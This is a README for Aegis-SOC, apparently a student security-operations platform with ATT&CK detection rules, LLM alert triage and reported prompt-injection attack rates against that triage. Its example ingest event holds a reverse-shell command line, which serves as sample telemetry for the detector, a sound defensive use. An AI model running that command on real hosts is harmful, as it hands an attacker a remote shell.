# Aegis-SOC

[![ci](https://github.com/Rhack-INDIA/aegis-soc/actions/workflows/ci.yml/badge.svg)](https://github.com/Rhack-INDIA/aegis-soc/actions/workflows/ci.yml)

Cloud-native, AI-assisted security operations platform that runs on Google Cloud's **free tier at
$0/month**: ingest Linux telemetry → detect with ATT&CK-mapped rules + anomaly baseline → triage
each alert with an LLM → gate containment behind a deterministic policy.

Built for an M.Tech Advanced Cloud Computing project. `REPORT.md` contains the full write-up and
the measured evaluation.

**Live demo:** <http://3.106.151.93> (AWS EC2, SQLite store, mock LLM — press *Run attack simulation*)

> **Deployment reality, stated plainly:** the reference architecture in `REPORT.md` targets Google
> Cloud Run at $0/month. The demonstration instance runs on a single AWS EC2 `t3.micro`
> (~$7.60/month) because the GCP billing account was closed at delivery time. Same image, same code,
> different host — the $0 claim applies to the Cloud Run target, not to this instance.

```
POST /ingest ──▶ normalise (ECS-lite)
                     │
        ┌────────────┴─────────────┐
        ▼                          ▼
  13 ATT&CK rules          anomaly baseline
        └────────────┬─────────────┘
                     ▼
              fusion (per technique)
                     ▼
            LLM triage  ──▶ strict JSON schema
                     ▼
        Firestore  ←→  operator console
                     ▼
        policy gate ──▶ simulated edge block
```

## Quick start (no cloud account, no API key)

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt

python lab/gen_corpus.py          # generate labelled corpus + baseline
uvicorn app.main:app --port 8080  # open http://localhost:8080
```

Open the console and press **Run attack simulation**. Everything works offline: storage is SQLite
and the LLM runs in a deterministic mock mode that is labelled `simulated` in the UI and in
`/api/health`.

Then generate the evaluation numbers:

```bash
python scripts/eval.py            # writes evals/results.json
```

## Measured results

| Phase | Result |
|---|---|
| Benign replay (600 events) | 0 false positives |
| Attack corpus (13 techniques) | recall 1.000, precision 1.000, F1 1.000 |
| **Evasion set (6 variants)** | **attribution 1/6 (0.17)** — the honest number |
| **Prompt injection, undefended** | **ASR 58.3% (7/12 hijacked)** |
| **Prompt injection, defences D1–D5** | **ASR 0.0% (0/12)** |
| Cost | $0.00 |

The 1.000 in row 2 is a correctness check on the pipeline, not a claim about real-world detection —
the corpus and the rules were written together. Row 3 is what the detector is actually worth. Both
statements are in `REPORT.md §7.1`.

## Two modes

| | Local demo | Cloud |
|---|---|---|
| Store | SQLite (`data/aegis.db`) | Firestore |
| LLM | mock (deterministic, labelled) | Gemini free tier, mock fallback |
| Run | `uvicorn app.main:app` | Cloud Run |

Set `GEMINI_API_KEY` to switch the LLM from mock to live; the console header and every triage
record show which mode produced a result. If the API call fails or returns malformed JSON, triage
falls back to mock and records `mode: gemini-fallback` — a demo never dies because a quota did.

## Deploy to GCP (free tier)

```bash
export PROJECT_ID=your-project REGION=us-central1 GEMINI_API_KEY=...
./deploy.sh
```

The script enables only the APIs used, creates a Firestore database, an Artifact Registry repo, a
Secret Manager entry for the key, builds one image via Cloud Build, and deploys Cloud Run with
`--max-instances=3 --memory=512Mi`. See `docs/DEPLOY_NOTES.md` for the cost guardrails to apply
first.

## Deploy to AWS (single EC2 instance)

```bash
REGION=us-east-1 ./deploy-aws.sh
```

Launches one `t3.micro` from the latest Amazon Linux 2023 AMI; the instance installs Docker, clones
this repository, builds the image and starts the container. The console is then reachable two ways:
`http://<public-ip>:8080` (security group opens 8080) and a Cloudflare quick-tunnel HTTPS URL that is
printed to the instance console — no inbound port required for that path.

```bash
aws ec2 get-console-output --region us-east-1 --instance-id <id> --latest \
  | grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' | head -1
```

Costs: `t3.micro` is ~$0.0104/hr (~$7.60/month) plus a few cents of EBS; the 750 hr/month free tier
applies only to accounts younger than 12 months. **Terminate the instance when the demo is over** —
the script prints the exact command. Unlike the GCP path this is not a $0 design; it is the
fastest way to get a real cloud-hosted URL without a Firestore/Artifact Registry setup.

Caveats, stated plainly: the app has no user authentication, so opening 8080 to `0.0.0.0/0` is
demo-only; use the tunnel URL and restrict the security group if it will stay up.

## Continuous deployment (pull-based)

`release.yml` builds, smoke-tests (asserting ≥10 alerts) and publishes
`ghcr.io/rhack-india/aegis-soc:latest` on every push to `main`. The host runs **Watchtower**, which
polls that tag and restarts the container when the digest changes. A merge to `main` therefore
reaches production **without inbound SSH, open ports or cloud credentials in CI** — the instance
pulls, nothing pushes to it.

One-time host setup:

```bash
sudo docker pull ghcr.io/rhack-india/aegis-soc:latest
sudo docker rm -f aegis
sudo docker run -d --name aegis --restart unless-stopped -p 80:8080 \
  -e STORE=sqlite -e SQLITE_PATH=/data/aegis.db -e AUTO_TRIAGE=1 \
  -e APPLY_BLOCKS=simulated -v /opt/aegis-data:/data \
  ghcr.io/rhack-india/aegis-soc:latest

sudo docker run -d --name watchtower --restart unless-stopped \
  -v /var/run/docker.sock:/var/run/docker.sock \
  containrrr/watchtower --interval 60 aegis
```

After that, `git push` → ci → release → live, with about a one-minute lag.

**Architecture caveat:** the published image is **linux/amd64 only** (GitHub runners are x86). That
matches `t3.micro` — confirm with `uname -m` on the host. On an arm64 machine the image will not
run; build locally there instead, or add a `docker buildx --platform linux/amd64,linux/arm64` step.

## API

| Method | Path | Purpose |
|---|---|---|
| POST | `/ingest` | One event, `[...]`, or `{"events":[...]}` |
| GET | `/api/alerts?limit=` | Alert queue |
| GET | `/api/alerts/{id}` | Alert + triage |
| POST | `/api/alerts/{id}/triage?defenses=true|false` | Re-triage, toggle defences |
| POST | `/api/alerts/{id}/block` | Policy gate (D4) — LLM verdict is not an input |
| GET | `/api/stats` · `/api/health` | Counters, mode |
| POST | `/api/simulate/attack` · `/api/simulate/injection` · `/api/reset` | Demo helpers |

Example event:

```bash
curl -X POST localhost:8080/ingest -H 'content-type: application/json' -d '{
  "ts": "2026-10-19T08:00:00Z", "host": "web-01", "user": "root",
  "event_type": "process", "process": "bash",
  "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
}'
```

## CI/CD and security gates

Every push runs `ci.yml`: ruff → pytest → bandit (fail on MEDIUM+) → pip-audit → gitleaks (full
history) → hadolint → Trivy (fails only on **fixable** HIGH/CRITICAL) → container smoke test that
boots the image and asserts ≥10 alerts. `deploy.yml` is manual-only, re-runs every gate, uses
keyless auth via Workload Identity Federation, and sits behind a reviewer-approved `production`
environment.

`SECURITY-CICD-REPORT.md` records the ten findings from two scanner rounds, what was fixed, what was
accepted with reasoning, and the measured CPU/memory/latency numbers. Run the same gates locally:

```bash
pip install ruff bandit pip-audit && ./scripts/security_checks.sh
```

## Layout

```
app/          schema.py store.py detect.py triage.py injections.py main.py static/
lab/          gen_corpus.py          # benign + attack + evasion corpus
scripts/      eval.py                # regenerates every evaluation number
              loadtest.py            # throughput/latency measurement
              security_checks.sh     # local mirror of the CI gates
              ui_smoke_cdp.py        # clicks every UI button over CDP, catches JS errors
              build_docs.sh          # rebuilds all PDFs with author/title metadata
              set_doc_metadata.py    # normalises pptx/docx metadata to the author
              polish_slides.py       # sets font sizes on the architecture slide
tests/        test_aegis.py            # 14 behavioural tests (detection, triage, policy gate)
              test_api_contracts.py    # 16 API-shape + regression tests (30 total)
.github/      workflows/ci.yml, deploy.yml · dependabot.yml
docs/         DEMO_SCRIPT.md VIVA_QA.md DEPLOY_NOTES.md 4-DAY_PLAN.md
              Aegis-SOC-Report.pdf · Aegis-SOC-Security-CICD.pdf
REPORT.md                    architecture + detection evaluation
SECURITY-CICD-REPORT.md      pipeline, security findings, resource consumption
evals/        results.json · security/* · resource/*
```

## Deliberate non-goals

No multi-tenant auth, no Windows/network telemetry, no live firewall changes
(`APPLY_BLOCKS=simulated`), no long-term retention. These are listed as limitations in the report
rather than quietly implied to be done.
